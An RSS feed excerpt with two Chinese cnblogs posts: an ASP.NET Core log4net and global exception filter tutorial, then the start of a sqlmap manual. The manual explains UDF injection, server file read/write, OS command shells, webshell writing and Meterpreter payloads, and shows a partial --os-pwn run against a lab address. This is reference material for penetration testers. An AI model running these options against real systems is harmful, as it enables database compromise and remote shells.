        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 错误信息
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;source&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;source&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;message&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;message&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;exception&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;ex&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; Error(&lt;span&gt;object&lt;/span&gt; source, &lt;span&gt;object&lt;/span&gt;&lt;span&gt; message, Exception exception)
        {
            Error(source.GetType(), message, exception);
        }
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 错误信息
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;source&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;source&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;message&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;message&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;exception&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;ex&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; Error(Type source, &lt;span&gt;object&lt;/span&gt;&lt;span&gt; message, Exception exception)
        {
            GetLogger(source).Error(message, exception);
        }
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 失败信息
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;source&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;source&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;message&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;message&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;exception&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;ex&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; Fatal(&lt;span&gt;object&lt;/span&gt; source, &lt;span&gt;object&lt;/span&gt;&lt;span&gt; message, Exception exception)
        {
            Fatal(source.GetType(), message, exception);
        }
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 失败信息
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;source&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;source&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;message&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;message&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;exception&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;ex&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; Fatal(Type source, &lt;span&gt;object&lt;/span&gt;&lt;span&gt; message, Exception exception)
        {
            GetLogger(source).Fatal(message, exception);
        }
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;h3&gt;2、引用 nuget 包 &lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1468246/201810/1468246-20181026125101507-1843822050.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;这个时候，你会发现还有一个错误 ， 不过别慌，请往下看。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1468246/201810/1468246-20181026125235981-389074770.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;


&lt;h3&gt;1、在启动文件中添加 Loger 日志仓库&lt;/h3&gt;
&lt;p&gt;这个具体深入的概念，我还在研究中，有时间补充下，这里大概了解用法以及概念，留一个坑&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; log4net 仓储库
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; ILoggerRepository repository { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;; }
&lt;/pre&gt;&lt;/div&gt;
&lt;blockquote readability=&quot;14&quot;&gt;
&lt;p&gt;Repository可以说成基于一个log4net配置节创建的log4net容器，它根据log4net配置节的指示创建其他所有对象（Logger/Appender/Filter/Layout等等）并保有他们的实例，随时为你所用。&lt;/p&gt;
&lt;p&gt; 每个Repository都有自己唯一的名字，如 root。&lt;/p&gt;
&lt;p&gt; 一般而言一个AppDomain(或者说一个进程)有一个Repository，该AppDomain下所有程序集Assembly都可以使用这个Repository。Repository需要实现ILoggerRepository，log4net中log4net.Repository.Hierarchy.Hierarchy就通过继承LoggerRepositorySkeleton实现了ILoggerRepository，它也是log4net中唯一实现ILoggerRepository的类。     &lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;2、在 Startup.cs 启动文件的 构造函数中，添加日志启动&lt;/h3&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
 &lt;span&gt;//&lt;/span&gt;&lt;span&gt;log4net&lt;/span&gt;
 repository = LogManager.CreateRepository(&quot;&quot;&lt;span&gt;);&lt;span&gt;//需要获取日志的仓库名，也就是你的当然项目名
 &lt;/span&gt;&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;指定配置文件&lt;/span&gt;
 XmlConfigurator.Configure(repository, &lt;span&gt;new&lt;/span&gt; FileInfo(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;log4net.config&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;));&lt;span&gt;//配置文件&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;h3&gt;3、配置 log4net.config 文件&lt;/h3&gt;
&lt;p&gt; 在 Blog.core 根目录下，添加 Log4net.config&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&amp;lt;?xml version=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;1.0&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; encoding=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;utf-8&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;?&amp;gt;
&amp;lt;configuration&amp;gt;
  &amp;lt;configSections&amp;gt;
    &amp;lt;section name=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;log4net&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; type=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;log4net.Config.Log4NetConfigurationSectionHandler, log4net&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;/&amp;gt;
  &amp;lt;/configSections&amp;gt;

  &amp;lt;log4net&amp;gt;
    &amp;lt;!-- 将日志以回滚文件的形式写到文件中 --&amp;gt;
    &amp;lt;!-- 按日期切分日志文件，并将日期作为日志文件的名字 --&amp;gt;
    &amp;lt;appender name=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;RollingFileAppenderNameByDate&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; type=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;log4net.Appender.RollingFileAppender&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&amp;gt;
      &amp;lt;!-- 日志文件存放位置，可以为绝对路径也可以为相对路径 --&amp;gt;
      &amp;lt;file value=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;C:\Logs\&quot; /&amp;gt;&lt;/span&gt;
      &amp;lt;!-- 将日志信息追加到已有的日志文件中--&amp;gt;
      &amp;lt;appendToFile value=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;true&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; /&amp;gt;
      &amp;lt;!-- 最小锁定模式，以允许多个进程可以写入同一个文件 --&amp;gt;
      &amp;lt;lockingModel type=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;log4net.Appender.FileAppender+MinimalLock&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; /&amp;gt;
      &amp;lt;!-- 指定按日期切分日志文件 --&amp;gt;
      &amp;lt;rollingStyle value=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Date&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; /&amp;gt;
      &amp;lt;!-- 日志文件的命名规则 --&amp;gt;
      &amp;lt;datePattern value=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;&amp;amp;quot;UtilLogs_&amp;amp;quot;yyyyMMdd&amp;amp;quot;.log&amp;amp;quot;&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; /&amp;gt;
      &amp;lt;!-- 当将日期作为日志文件的名字时，必须将staticLogFileName的值设置为false --&amp;gt;
      &amp;lt;staticLogFileName value=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;false&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; /&amp;gt;
      &amp;lt;!-- 日志显示模板 --&amp;gt;
      &amp;lt;layout type=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;log4net.Layout.PatternLayout&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&amp;gt;
        &amp;lt;conversionPattern value=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;【异常时间】：%date %newline%message%newline--------------------------------------------------------------------%newline&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; /&amp;gt;
      &amp;lt;/layout&amp;gt;
    &amp;lt;/appender&amp;gt;

    &amp;lt;root&amp;gt;
      &amp;lt;!-- 控制级别，由低到高：ALL|DEBUG|INFO|WARN|ERROR|FATAL|OFF --&amp;gt;
      &amp;lt;!-- 比如定义级别为INFO，则INFO级别向下的级别，比如DEBUG日志将不会被记录 --&amp;gt;
      &amp;lt;!-- 如果没有定义LEVEL的值，则缺省为DEBUG --&amp;gt;
      &amp;lt;level value=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;ALL&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; /&amp;gt;
      &amp;lt;!-- 按日期切分日志文件，并将日期作为日志文件的名字 --&amp;gt;
      &amp;lt;appender-&lt;span&gt;ref&lt;/span&gt; &lt;span&gt;ref&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;RollingFileAppenderNameByDate&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; /&amp;gt;
    &amp;lt;/root&amp;gt;
  &amp;lt;/log4net&amp;gt;
&amp;lt;/configuration&amp;gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;最终的结构是&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1468246/201810/1468246-20181026130854690-1967990702.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;这个时候，我们已经把日志添加好了，可以在任何需用用的地方去使用了，你会问了，不是全局么，总不能每个方法都写 try catch 吧，有想法，请往下看。&lt;/p&gt;


&lt;p&gt;&lt;strong&gt;提醒下：&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;1、下边的全局处理中，网友@：IExceptionFilter只能抓取Action执行过程中出现的未处理的异常。如果想捕获view中的异常需要在startup中的Configure中 实现app.UseExceptionHandler()；&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3&gt;1、日志接口进行注入&lt;/h3&gt;
&lt;p&gt; 在 启动文件的 ConfigureServices方法中，添加服务注入&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
   &lt;span&gt;//&lt;/span&gt;&lt;span&gt;log日志注入&lt;/span&gt;
   services.AddSingleton&amp;lt;ILoggerHelper, LogHelper&amp;gt;();
&lt;/pre&gt;&lt;/div&gt;

&lt;h3&gt;2、Blog.core 新建Filter 文件夹，添加 GlobalExceptionFilter.cs&lt;/h3&gt;

&lt;div class=&quot;cnblogs_code&quot; readability=&quot;43&quot;&gt;
&lt;pre&gt;
&lt;span&gt;namespace&lt;/span&gt;&lt;span&gt; Blog.Core.Filter
{
    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 全局异常错误日志
    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; GlobalExceptionsFilter : IExceptionFilter
    {
        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;readonly&lt;/span&gt;&lt;span&gt; IHostingEnvironment _env;
        &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;readonly&lt;/span&gt;&lt;span&gt; ILoggerHelper _loggerHelper;
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; GlobalExceptionsFilter(IHostingEnvironment env, ILoggerHelper loggerHelper)
        {
            _env &lt;/span&gt;=&lt;span&gt; env;
            _loggerHelper &lt;/span&gt;=&lt;span&gt; loggerHelper;
        }
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; OnException(ExceptionContext context)
        {
            &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; json = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; JsonErrorResponse();
            json.Message &lt;/span&gt;= context.Exception.Message;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;错误信息&lt;/span&gt;
            &lt;span&gt;if&lt;/span&gt;&lt;span&gt; (_env.IsDevelopment())
            {
                json.DevelopmentMessage &lt;/span&gt;= context.Exception.StackTrace;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;堆栈信息&lt;/span&gt;
&lt;span&gt;            }
            context.Result &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; InternalServerErrorObjectResult(json);

            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;采用log4net 进行错误日志记录&lt;/span&gt;
&lt;span&gt;            _loggerHelper.Error(json.Message, WriteLog(json.Message, context.Exception));

        }

        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 自定义返回格式
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;throwMsg&quot;&amp;gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;ex&quot;&amp;gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;returns&amp;gt;&amp;lt;/returns&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; WriteLog(&lt;span&gt;string&lt;/span&gt;&lt;span&gt; throwMsg, Exception ex)
        {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;string&lt;/span&gt;.Format(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;【自定义错误】：{0} \r\n【异常类型】：{1} \r\n【异常信息】：{2} \r\n【堆栈调用】：{3}&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;new&lt;/span&gt; &lt;span&gt;object&lt;/span&gt;&lt;span&gt;[] { throwMsg,
                ex.GetType().Name, ex.Message, ex.StackTrace });
        }

    }
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; InternalServerErrorObjectResult : ObjectResult
    {
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; InternalServerErrorObjectResult(&lt;span&gt;object&lt;/span&gt; value) : &lt;span&gt;base&lt;/span&gt;&lt;span&gt;(value)
        {
            StatusCode &lt;/span&gt;=&lt;span&gt; StatusCodes.Status500InternalServerError;
        }
    }
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;返回错误信息&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; JsonErrorResponse
    {
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 生产环境的消息
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; Message { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 开发环境的消息
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; DevelopmentMessage { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }
    }

}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;h3&gt;3、在启动服务中，注入全局异常&lt;/h3&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;//&lt;/span&gt;&lt;span&gt;注入全局异常捕获&lt;/span&gt;
services.AddMvc(o =&amp;gt;&lt;span&gt;
{
    o.Filters.Add(&lt;/span&gt;&lt;span&gt;typeof&lt;/span&gt;&lt;span&gt;(GlobalExceptionsFilter));
}).SetCompatibilityVersion(CompatibilityVersion.Version_2_1);&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;结构是这样的&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1468246/201810/1468246-20181026132141888-616466202.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;h3&gt;4、自定义错误进行测试&lt;/h3&gt;
&lt;p&gt; 我故意写错数据库连接字符串，看看 swagger 如何报错&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1468246/201810/1468246-20181026132521068-2139239715.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;看看日志是如何记录的&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1468246/201810/1468246-20181026132548219-75234028.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;


&lt;p&gt;今天是不定期更新系列，也是群里小伙伴提出来的想法，我自己简单搞搞，这里希望大家可以积极提意见哟，如果技术不错，我会把你的个人主页和Git放到文章中，也算是鼓励大家的一个方式了。&lt;/p&gt;


&lt;p&gt;&lt;a href=&quot;https://github.com/anjoy8/Blog.Core&quot; target=&quot;_blank&quot;&gt;https://github.com/anjoy8/Blog.Core&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://gitee.com/laozhangIsPhi/Blog.Core&quot; target=&quot;_blank&quot;&gt;https://gitee.com/laozhangIsPhi/Blog.Core&lt;/a&gt;&lt;/p&gt;
</description>
<pubDate>Fri, 26 Oct 2018 05:33:00 +0000</pubDate>
<dc:creator>老张的哲学</dc:creator>
<og:description>缘起 哈喽我是不定期更新的日常，昨天群里小伙伴问到了记录日志，当然，以前我也挖过这个坑，后来一直没有来得及填上，也想着 swagger 一直又有错误信息展示的功能，就迟迟没有添加这个功能，不过昨天夜里</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/laozhang-is-phi/p/9855836.html</dc:identifier>
</item>
<item>
<title>记一份SQLmap使用手册小结（二） - 落花四月</title>
<link>http://www.cnblogs.com/miraitowa/p/9855599.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/miraitowa/p/9855599.html</guid>
<description>&lt;h2 id=&quot;前言&quot;&gt;前言&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/BnKxkBz.jpg&quot;/&gt;&lt;/p&gt;
&lt;p&gt;上一篇文章：&lt;a href=&quot;https://xz.aliyun.com/t/3010&quot;&gt;记一份SQLmap使用手册小结（一）&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;希望各位大佬轻喷(QAQ)&lt;/p&gt;
&lt;p&gt;首发先知社区：&lt;a href=&quot;https://xz.aliyun.com/t/3011&quot; class=&quot;uri&quot;&gt;https://xz.aliyun.com/t/3011&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;其他高级&quot;&gt;其他高级&lt;/h3&gt;
&lt;h4 id=&quot;用户自定义函数注入&quot;&gt;用户自定义函数注入&lt;/h4&gt;
&lt;p&gt;参数：&lt;code&gt;–udf-inject,–shared-lib&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;你可以通过编译&lt;code&gt;MySQL&lt;/code&gt;注入你自定义的函数&lt;code&gt;（UDFs）或PostgreSQL&lt;/code&gt;在&lt;code&gt;windows&lt;/code&gt;中共享库，&lt;code&gt;DLL&lt;/code&gt;，或者&lt;code&gt;Linux/Unix&lt;/code&gt;中共享对象，&lt;/p&gt;
&lt;p&gt;&lt;code&gt;sqlmap&lt;/code&gt;将会问你一些问题，上传到服务器数据库自定义函数，然后根据你的选择执行他们，当你注入完成后，&lt;code&gt;sqlmap&lt;/code&gt;将会移除它们。&lt;/p&gt;
&lt;h4 id=&quot;系统文件操作&quot;&gt;系统文件操作&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;从数据库服务器中读取文件&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;参数：&lt;code&gt;–file-read&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;当数据库为&lt;code&gt;MySQL，PostgreSQL&lt;/code&gt;或&lt;code&gt;Microsoft SQLServer&lt;/code&gt;，并且当前用户有权限使用特定的函数。读取的文件可以是文本也可以是二进制文件。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;把文件上传到数据库服务器中&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;参数：&lt;code&gt;–file-write,–file-dest&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;当数据库为&lt;code&gt;MySQL，PostgreSQL或Microsoft SQLServer&lt;/code&gt;，并且当前用户有权限使用特定的函数。上传的文件可以是文本也可以是二进制文件。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;运行任意操作系统命令&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;参数：&lt;code&gt;–os-cmd,–os-shell&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;当数据库为&lt;code&gt;MySQL，PostgreSQL或Microsoft SQL Server&lt;/code&gt;，并且当前用户有权限使用特定的函数。&lt;/p&gt;
&lt;p&gt;在&lt;code&gt;MySQL、PostgreSQL，sqlmap&lt;/code&gt;上传一个二进制库，包含用户自定义的函数，&lt;code&gt;sys_exec()和sys_eval()&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;那么他创建的这两个函数可以执行系统命令。在&lt;code&gt;Microsoft SQLServer，sqlmap&lt;/code&gt;将会使用&lt;code&gt;xp_cmdshell&lt;/code&gt;存储过程，&lt;/p&gt;
&lt;p&gt;如果被禁&lt;code&gt;（在Microsoft SQL Server2005&lt;/code&gt;及以上版本默认禁制），&lt;code&gt;sqlmap&lt;/code&gt;会重新启用它，如果不存在，会自动创建。&lt;/p&gt;
&lt;p&gt;用&lt;code&gt;–os-shell&lt;/code&gt;参数也可以模拟一个真实的&lt;code&gt;shell&lt;/code&gt;，可以输入你想执行的命令。&lt;/p&gt;
&lt;p&gt;当不能执行多语句的时候（比如php或者asp的后端数据库为&lt;code&gt;MySQL&lt;/code&gt;时），仍然可能使用&lt;code&gt;INTOOUTFILE&lt;/code&gt;写进可写目录，来创建一个web后门。支持的语言：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;1、ASP

2、ASP.NET

3、JSP

4、PHP&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;Meterpreter配合使用&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;参数：&lt;code&gt;–os-pwn,–os-smbrelay,–os-bof,–priv-esc,–msf-path,–tmp-path&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;当数据库为&lt;code&gt;MySQL，PostgreSQL或Microsoft SQLServer&lt;/code&gt;，并且当前用户有权限使用特定的函数，可以在数据库与攻击者直接建立&lt;code&gt;TCP&lt;/code&gt;连接，&lt;/p&gt;
&lt;p&gt;这个连接可以是一个交互式命令行的&lt;code&gt;Meterpreter&lt;/code&gt;会话，&lt;code&gt;sqlmap&lt;/code&gt;根据&lt;code&gt;Metasploit&lt;/code&gt;生成&lt;code&gt;shellcode&lt;/code&gt;，并有四种方式执行它：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;1. 通过用户自定义的sys_bineval()函数在内存中执行Metasplit的shellcode，支持MySQL和PostgreSQL数据库，参数：--os-pwn。

2. 通过用户自定义的函数上传一个独立的payload执行，MySQL和PostgreSQL的sys_exec()函数，Microsoft SQL Server的xp_cmdshell()函数，参数：--os-pwn。

3. 通过SMB攻击(MS08-068)来执行Metasploit的shellcode，当sqlmap获取到的权限足够高的时候（Linux/Unix的uid=0，Windows是Administrator），--os-smbrelay。

4. 通过溢出Microsoft SQL Server 2000和2005的sp_replwritetovarbin存储过程(MS09-004)，在内存中执行Metasploit的payload，参数：--os-bof&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;列举一个&lt;code&gt;MySQL&lt;/code&gt;例子：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;$ python sqlmap.py -u
&quot;http://192.168.136.129/sqlmap/mysql/iis/get_int_55.aspx?id=1&quot; --os-pwn
--msf-path /software/metasploit
[...]
[hh:mm:31] [INFO] the back-end DBMS is MySQL
web server operating system: Windows 2003
web application technology: ASP.NET, ASP.NET 4.0.30319, Microsoft IIS 6.0
back-end DBMS: MySQL 5.0
[hh:mm:31] [INFO] fingerprinting the back-end DBMS operating system
[hh:mm:31] [INFO] the back-end DBMS operating system is Windows
how do you want to establish the tunnel?
[1] TCP: Metasploit Framework (default)
[2] ICMP: icmpsh - ICMP tunneling
\&amp;amp;gt;
[hh:mm:32] [INFO] testing if current user is DBA
[hh:mm:32] [INFO] fetching current user
what is the back-end database management system architecture?
[1] 32-bit (default)
[2] 64-bit
\&amp;amp;gt;
[hh:mm:33] [INFO] checking if UDF 'sys_bineval' already exist
[hh:mm:33] [INFO] checking if UDF 'sys_exec' already exist
